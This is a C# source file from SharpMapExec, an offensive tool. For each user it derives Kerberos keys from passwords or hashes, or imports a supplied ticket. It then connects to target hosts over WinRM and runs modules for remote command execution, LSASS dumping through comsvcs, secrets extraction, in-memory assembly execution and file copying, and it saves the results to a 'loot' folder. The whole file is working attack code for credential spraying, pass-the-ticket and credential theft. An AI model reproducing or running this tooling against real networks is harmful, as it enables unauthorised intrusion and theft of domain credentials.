using Rubeus;
using SharpMapExec.Helpers;
using System;
using System.Collections.Generic;
using System.IO;
using static Rubeus.Interop;

namespace SharpMapExec.Lib
{
    public class kerberoswinrm
    {
        public static void KerberosWinRm(string[] users, string domain, string[] passwords, string[] hash, string ticket, KERB_ETYPE encType, string dc, string[] computernames, string module, string moduleargument, string path, string destination, List<string> flags)
        {
            if (module.Contains("exec") && moduleargument.Length == 0)
            {
                Console.WriteLine("[-] Missing exec argument");
                return;
            }
            if (module.Contains("assembly") && !File.Exists(path))
            {
                Console.WriteLine("[-] Missing assembly path");
                return;
            }
            if (module.Contains("download") && (String.IsNullOrEmpty(path) || String.IsNullOrEmpty(destination)))
            {
                Console.WriteLine("[-] Need path and destination");
                return;
            }
            StartJob(users, domain, passwords, hash, ticket, encType, dc, computernames, module, moduleargument, path, destination, flags);
            //var listOfTasks = new List<Task>();
            //listOfTasks.Add(new Task(() => StartJob(users, domain, passwords, hash, ticket, encType, dc, computernames, module, moduleargument, flags)));
            //Tasks.StartAndWaitAllThrottled(listOfTasks, 1);
        }

        public static void StartJob(string[] users, string domain, string[] passwords, string[] hashes, string ticket, KERB_ETYPE encType, string dc, string[] computernames, string module, string moduleargument, string path, string destination, List<string> flags)
        {
            AToken.MakeToken("Fake", "Fake", "Fake");
            string ticketoutput;
            if (String.IsNullOrEmpty(ticket))
            {
                foreach (string user in users)
                {
                    var secrets = hashes.Length > 0 ? hashes : passwords;
                    foreach (string secret in secrets)
                    {
                        string hash;
                        if (passwords.Length > 0)
                        {
                            string salt = String.Format("{0}{1}", domain.ToUpper(), user);
                            hash = Crypto.KerberosPasswordHash(encType, secret, salt);
                        }
                        else
                        {
                            hash = secret;
                        }

                        Console.WriteLine("------------------");
                        Console.WriteLine(string.Format("[*] User:   {0}", user));
                        Console.WriteLine(string.Format("[*] domain: {0}", domain));
                        Console.WriteLine(string.Format("[*] secret: {0}", secret));
                        ticketoutput = SecurityContext.AskTicket(user, domain, hash, encType, dc);
                        if (ticketoutput.Contains("[+] Ticket successfully imported!"))
                            Console.WriteLine("[+] Ticket successfully imported!");
                        else
                        {
                            Console.WriteLine("[-] Could not request TGT");
                            continue;
                        }
                        //ticket debugging
                        //List<LSA.SESSION_CRED> sessionCreds = LSA.EnumerateTickets(false, new LUID(), "", "", "", true);
                        //LSA.DisplaySessionCreds(sessionCreds, LSA.TicketDisplayFormat.Klist);
                        Console.WriteLine();
                        foreach (string computername in computernames)
                        {
                            Console.WriteLine(String.Format("[*] Checking {0}", computername));
                            if (!Misc.CheckHostPort(computername, 5985))
                            {
                                Console.WriteLine(String.Format("[-] Could Not Reach {0}:5985", computername));
                                Console.WriteLine();
                                continue;
                            }
                            if (!Directory.Exists(Path.Combine("loot", computername)))
                            {
                                Directory.CreateDirectory(Path.Combine("loot", computername));
                            }
                            if (module.Length == 0 || module.Contains("exec"))
                            {
                                Wsman.CheckLocalAdmin(computername, moduleargument, flags);
                            }
                            else if (module.Contains("comsvcs"))
                            {
                                Wsman.InvokeComSvcsLsassDump(computername);
                            }
                            else if (module.Contains("secrets") || module.Contains("secret"))
                            {
                                Wsman.GetSecrets(computername);
                            }
                            else if (module.Contains("assembly"))
                            {
                                Wsman.ExecuteAssembly(computername, path, moduleargument, flags);
                            }
                            else if (module.Contains("download"))
                            {
                                Wsman.CopyFile(computername, path, destination);
                            }
                            Console.WriteLine("");
                        }
                    }
                }
            }
            else
            {
                Console.WriteLine("------------------");
                Console.WriteLine(string.Format("[*] Ticket: {0}", ticket));
                ticketoutput = SecurityContext.ImportTicket(ticket);
                if (ticketoutput.Contains("[+] Ticket successfully imported!"))
                    Console.WriteLine("[+] TGT imported successfully!");
                else
                {
                    Console.WriteLine("[-] Could not import TGT");
                    return;
                }
                //ticket debugging
                //List<LSA.SESSION_CRED> sessionCreds = LSA.EnumerateTickets(false, new LUID(), "", "", "", true);
                //LSA.DisplaySessionCreds(sessionCreds, LSA.TicketDisplayFormat.Klist);
                Console.WriteLine();
                foreach (string computername in computernames)
                {
                    Console.WriteLine(String.Format("[*] Checking {0}", computername));
                    if (!Misc.CheckHostPort(computername, 5985))
                    {
                        Console.WriteLine(String.Format("[-] Could Not Reach {0}:5985", computername, flags));
                        Console.WriteLine();
                        continue;
                    }
                    if (!Directory.Exists(Path.Combine("loot", computername)))
                    {
                        Directory.CreateDirectory(Path.Combine("loot", computername));
                    }
                    if (module.Length == 0 || module.Contains("exec"))
                    {
                        Wsman.CheckLocalAdmin(computername, moduleargument, flags);
                    }
                    else if (module.Contains("comsvcs"))
                    {
                        Wsman.InvokeComSvcsLsassDump(computername);
                    }
                    else if (module.Contains("secrets") || module.Contains("secret"))
                    {
                        Wsman.GetSecrets(computername);
                    }
                    else if (module.Contains("assembly"))
                    {
                        Wsman.ExecuteAssembly(computername, path, moduleargument, flags);
                    }
                    else if (module.Contains("download"))
                    {
                        Wsman.CopyFile(computername, path, destination);
                    }
                    Console.WriteLine("");
                }
            }
            AToken.RevertFromToken();
        }
    }
}